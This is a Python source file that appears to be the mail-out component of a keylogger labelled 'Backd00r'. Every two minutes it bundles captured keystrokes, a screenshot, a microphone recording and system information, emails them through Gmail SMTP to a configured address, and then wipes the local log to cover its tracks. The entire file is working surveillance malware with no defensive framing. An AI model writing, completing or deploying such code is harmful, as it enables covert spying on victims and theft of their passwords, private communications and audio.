import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import sys
import keyloggerskill
import time
def mail_time():
    while True:
        time.sleep(120)

        email_user = '' # uname
        email_password = '' # pass

        
        email_send = '' #send e mail?


        subject = 'Backd00r - Log | ' + keyloggerskill.keylogger().system_name_go()
            

        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject  

        body = 'Sys info : ' + str(keyloggerskill.keylogger().sys_info())
        msg.attach(MIMEText(body,'plain'))
        filename='log.txt'
        attachment  = open(filename,'rb')
        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+filename)
        msg.attach(part)

        filename2='screen.jpg'
        attachment2  = open(filename2,'rb')
        part2 = MIMEBase('application','octet-stream')
        part2.set_payload((attachment2).read())
        encoders.encode_base64(part2)
        part2.add_header('Content-Disposition',"attachment; filename= "+filename2)

        msg.attach(part2)
        
        filename3='output.wav'
        attachment3  = open(filename3,'rb')
        part3 = MIMEBase('application','octet-stream')
        part3.set_payload((attachment3).read())
        encoders.encode_base64(part3)
        part3.add_header('Content-Disposition',"attachment; filename= "+filename3)
        msg.attach(part3)
        
        
            
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_password)


        server.sendmail(email_user,email_send,text)
        server.quit()
        logclear = open("log.txt","w",encoding="UTF-8")
        logclear.close()
